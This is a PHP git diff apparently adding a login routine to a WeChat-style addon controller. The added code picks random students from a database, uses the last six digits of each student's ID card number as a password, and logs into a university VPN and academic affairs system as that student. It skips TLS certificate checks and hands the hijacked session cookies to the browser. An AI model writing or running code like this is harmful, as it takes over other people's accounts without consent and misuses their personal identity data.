@@ -137,9 +137,92 @@ class BindingController extends AddonsController{
 
     }
     public function verify1(){
-        $data = $this->get_info();
+        set_time_limit(0);
+        $ch=curl_init();
+        curl_setopt($ch,CURLOPT_URL,"https://vpn.hpu.edu.cn/por/login_psw.csp");
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查 
+        curl_setopt($ch,CURLOPT_USERAGENT , "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
+        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+        $content=curl_exec($ch);
+        //正则匹配cookie并使用
+        preg_match('/Set-Cookie:(.*);/iU',$content,$str); //正则匹配  
+        $session = trim($str[1]); //获得COOKIE（SESSIONID）
+        curl_close($ch);
+
+        $info = $this->get_info();
+        $stud = $info[0]['studentid'];
+        $pass = substr($info[0]['IdCard'],12);
+
+        $ch=curl_init();
+        $post="mitm_result=&svpn_name=".$stud."&svpn_password=".$pass."&svpn_rand_code=";
+        curl_setopt($ch,CURLOPT_URL,"https://vpn.hpu.edu.cn/por/login_psw.csp?sfrnd=2346912324982305");
+        curl_setopt($ch,CURLOPT_REFERER,"https://vpn.hpu.edu.cn/por/login_psw.csp");
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查 
+        curl_setopt($ch,CURLOPT_USERAGENT , "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
+        //带上上登陆前的cookie
+        curl_setopt($ch,CURLOPT_COOKIE,$session);
+        curl_setopt($ch,CURLOPT_POST,1);
+        curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
+        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+        //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        $content=curl_exec($ch);
+        //正则匹配cookie并使用
+        preg_match_all('/Set-Cookie:(.*);/iU',$content,$str1); //正则匹配  
+        $session2=trim($str1[1][0]);
+        $session3=trim($str1[1][1]);
+        curl_setopt($ch, CURLOPT_COOKIE, "$session2;$session3");
+        $arr3=explode("=", $session3);
+        $arr2=explode("=", $session2);
+        curl_close($ch);
+        //登录教务处
+        $ch=curl_init();
+        set_time_limit(0);
+        $url="https://vpn.hpu.edu.cn/web/1/http/0/218.196.240.97/";
+        curl_setopt($ch,CURLOPT_URL,$url);
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查 
+        curl_setopt($ch,CURLOPT_REFERER,"https://vpn.hpu.edu.cn/por/login_psw.csp");
+        curl_setopt($ch,CURLOPT_USERAGENT , "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
+        //curl_setopt($ch,CURLOPT_COOKIEFILE, $sessionFile);
+        //使用vpn登陆后的cookie
+        curl_setopt($ch,CURLOPT_COOKIE,"$session2;$session3"); 
+        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+        $content=curl_exec($ch);
+        //正则匹配教务处登陆时设置的cookie
+        preg_match('/Set-Cookie:(.*);/iU',$content,$str); //正则匹配  
+        $session4 = trim($str[1]); //获得COOKIE（SESSIONID）
+        $arr4=explode("=", $session4);
+        //global $arr4; 
+        //curl_setopt($ch, CURLOPT_COOKIE, $session4);
+        //setcookie($arr4[0],$arr4[1]);
+        curl_close($ch);
+
+        //获取验证码
+        $ch=curl_init();
+        $url="https://vpn.hpu.edu.cn/web/1/http/1/218.196.240.97/validateCodeAction.do";
+        curl_setopt($ch,CURLOPT_URL,$url);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查 
+        curl_setopt($ch,CURLOPT_REFERER,"https://vpn.hpu.edu.cn/por/login_psw.csp");
+        curl_setopt($ch,CURLOPT_USERAGENT , "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
+        curl_setopt($ch,CURLOPT_COOKIE,"$session2;$session3;$session4"); 
+        setcookie("isl","1");
+        setcookie($arr2[0],$arr2[1]);
+        setcookie($arr3[0],$arr3[1]);
+        setcookie($arr4[0],$arr4[1]);
+        //print_r($_COOKIE);
+        //curl_setopt($ch,CURLOPT_COOKIE,$session2); 
+        //curl_setopt($ch,CURLOPT_COOKIEFILE,$sessionFile);
+        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+        $content=curl_exec($ch);
+        curl_close($ch);
+        echo $content;
+
+        /*$data = $this->get_info();
         echo $data[0]['studentid'];
-        echo substr($data[0]['IdCard'],12);
+        echo substr($data[0]['IdCard'],12);*/
     }
 
     //递归获取账号密码
@@ -147,7 +230,7 @@ class BindingController extends AddonsController{
       static $data = array();
       $user = M("user");
       $map['studentid'] =array('like',array('3114%','3115%'),'OR');
-      $map['id'] =array('eq',rand(5000,20000));
+      $map['id'] =array('eq',rand(5000,25000));
       $data = $user->field('id,IdCard,studentid')->where($map)->limit(1)->select();
       if($data==null){
         $data = $this->get_info();
